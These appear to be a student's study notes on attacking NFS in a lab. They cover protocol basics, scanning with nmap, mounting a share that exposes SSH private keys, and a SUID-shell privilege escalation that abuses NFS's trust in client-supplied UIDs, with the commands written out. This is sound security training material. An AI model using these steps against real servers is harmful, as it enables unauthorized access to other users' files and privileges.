NFS -> Network File System : is a network file system and has the same purpose as SMB.

Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. [NFS](https://en.wikipedia.org/wiki/Network_File_System) is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (`NFSv3`), which has been in use for many years, authenticates the client computer, this changes with `NFSv4`. Here, as with the Windows SMB protocol, the user must authenticate.

## Versions :

- NFSv2 : old , supported by many systems and was intially operated entirely over UDP.
- NFSv3 : more features , variable file size , better error reporting , not fully compatible with NFSv2 clients.
- NFSv4 : includes Kerberos , works through firewalls and on the internet ,no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. First version with stateful protocol

**Ports :** 
- **NFSv4+ uses just one port: 2049** (TCP or UDP). One port = easy to allow through firewalls.
- Older NFS also relies on **port 111** (RPC), which is the helper service that tells clients where to connect.

**How it's built**
- Runs on top of **RPC** (Remote Procedure Call) — a system for calling functions on a remote machine.
- Uses **XDR** to format data so it works the same regardless of the OS on either side.
- NFSv4.1 adds scaling features: **pNFS** (spread files across multiple servers for parallel access) and **multipathing/trunking** (multiple network paths for one session). Minor detail, not important for you right now.

**The security problem :**
- **NFS itself has no login/authentication.** It leaves that to RPC, and it decides permissions purely from **UNIX file ownership — UID (user ID) and GID (group ID)**.
- The server just trusts whatever UID/GID the client claims.
- **The flaw:** the client and server don't have to agree on who those IDs belong to. If a file is owned by UID 1000 on the server, and you create a local user with UID 1000 on *your* attacking machine, the server treats you as that owner — no real check happens.
- **Bottom line:** because you can impersonate any user just by matching their UID locally, NFS (with this default auth) should only ever run inside a **trusted network**. For a pentester, a misconfigured NFS share is an easy way to read or write files you shouldn't.

---

## Default Configuration :

The `/etc/exports` file contains a table of physical filesystems on an NFS server accessible by the clients. The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows which options it accepts and thus indicates which options are available to us.

## Exports File :

```bash
aymane0x90@htb[/htb]$ cat /etc/exports 

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

-> The folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.

| **Option**         | **Description**                                                                                                                             |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`               | Read and write permissions.                                                                                                                 |
| `ro`               | Read only permissions.                                                                                                                      |
| `sync`             | Synchronous data transfer. (A bit slower)                                                                                                   |
| `async`            | Asynchronous data transfer. (A bit faster)                                                                                                  |
| `secure`           | Ports above 1024 will not be used.                                                                                                          |
| `insecure`         | Ports above 1024 will be used.                                                                                                              |
| `no_subtree_check` | This option disables the checking of subdirectory trees.                                                                                    |
| `root_squash`      | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |

Let us create such an entry for test purposes and play around with the settings.

## ExportsFS :

```bash
root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
root@nfs:~# systemctl restart nfs-kernel-server 
root@nfs:~# exportfs

/mnt/nfs        10.129.14.0/24
```

We have shared the folder `/mnt/nfs` to the subnet `10.129.14.0/24` with the setting shown above.
All hosts on the netwok can mount the NFS share and inspect the contents of the folder .

## Dangerous Settings :

|**Option**|**Description**|
|---|---|
|`rw`|Read and write permissions.|
|`insecure`|Ports above 1024 will be used.|
|`nohide`|If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|
|`no_root_squash`|All files created by root are kept with the UID/GID 0.|

## Footprinting the Service :

When footprinting NFS, the TCP ports `111` and `2049` are essential. We can also get information about the NFS service and the host via RPC.

```bash
aymane0x90@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

The `rpcinfo` NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use.

- Nmap has some NSE scripts that can be used for the scans :

```bash
aymane0x90@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

We can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.

## Show Available NFS Shares :

```bash
aymane0x90@htb[/htb]$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

## Mounting NFS Share :

```bash
aymane0x90@htb[/htb]$ mkdir target-NFS
aymane0x90@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
aymane0x90@htb[/htb]$ cd target-NFS
aymane0x90@htb[/htb]$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

- We will have the opportunity to access the rights and the usernames and groups to whom the shown and viewable files belong.
- Once we have the usernames, group names, UIDs, and GUIDs, we can create them on our system and adapt them to the NFS share to view and modify the files.

## List Contents with Usernames & Group Names :

```bash
aymane0x90@htb[/htb]$ ls -l mnt/nfs/

total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

## List Contents with UIDs & GUID :

```bash 
aymane0x90@htb[/htb]$ ls -n mnt/nfs/

total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```
- if the `root_squash` option is set, we cannot edit the `backup.sh` file even as `root`.

## The SUID bit

Normally, when you run a program, it runs as you — with your user’s privileges.

But a file can have a special flag called the SUID bit (Set User ID). When a program has SUID set, it runs as the file’s owner, not as the person who launched it.

The classic real example is /usr/bin/passwd. Changing your password means writing to /etc/shadow, a file only root can touch. Yet a normal user can run passwd and change their password. How? passwd is SUID root — so even when you run it, it executes with root’s powers for the moment it runs. You can spot it in ls -l by the s where the owner’s x normally is:
```shell
-rwsr-xr-x 1 root root ... /usr/bin/passwd
   ^ that 's' is the SUID bit
```

So the one-line takeaway: a SUID binary owned by bob = “anyone who runs this becomes bob while it runs.”

If that binary happens to be a shell, then running it drops you into a shell as bob. That’s the whole weapon.

## The goal of the attack :

You have SSH access to a target as a low-privilege user — call them user1 (you).
There’s another user, user2, who can read files you can’t (or it’s root — same idea).
You want user2’s access.

Your plan: get a shell binary that is SUID user2 sitting on the target. Then you run it from your SSH session as user1, and because of the SUID bit, the shell runs as user2. Now you can read user2’s files.

## Why you can’t just do this normally :

As user1 on the target, you’re stuck:

You can’t chown a file to user2 — only root is allowed to give files away to another user.
You can’t create a SUID binary owned by user2 — same reason.

So locally, the attack is impossible. You need some way to plant a file on the target’s disk that’s already owned by user2 and already has SUID set.

### This is exactly what NFS hands you :

Here’s where the UID/GID trust gap you just learned about pays off. The NFS share is a folder that physically lives on the target’s disk — but you’re writing to it from your own attacker machine, where you are root. And NFS just trusts whatever ownership and permissions you set from the client side.

### So from your attacker box:

**On the attacker machine, as root, with the NFS share mounted :**
```shell
cp /bin/bash /mnt/nfs/rootshell     # drop a copy of a shell onto the share
chown user2 /mnt/nfs/rootshell      # make user2 the owner
chmod u+s /mnt/nfs/rootshell        # set the SUID bit
```

Because NFS didn’t stop you, that file now sits on the target’s disk, owned by user2, with SUID set — something you could never have created from inside your SSH session.

Then, back in your SSH session as user1, you run it:

```bash
/path/to/share/rootshell -p
```

(-p tells bash to keep the elevated privileges instead of dropping them.) The SUID bit makes that shell run as user2, and you’ve escalated.

>**The chain in one view :**
1- SSH into the target as low-priv user1.
2- From your attacker box (where you’re root), write a shell to the NFS share.
3- chown it to user2 and set SUID — NFS lets you because it trusts your client-side identity.
4- The file lands on the target’s disk with those exact properties.
5- Back in the SSH session, user1 runs it → the shell runs as user2 → access gained.

## Unmounting :

```bash
aymane0x90@htb[/htb]$ cd ..
aymane0x90@htb[/htb]$ sudo umount ./target-NFS
```

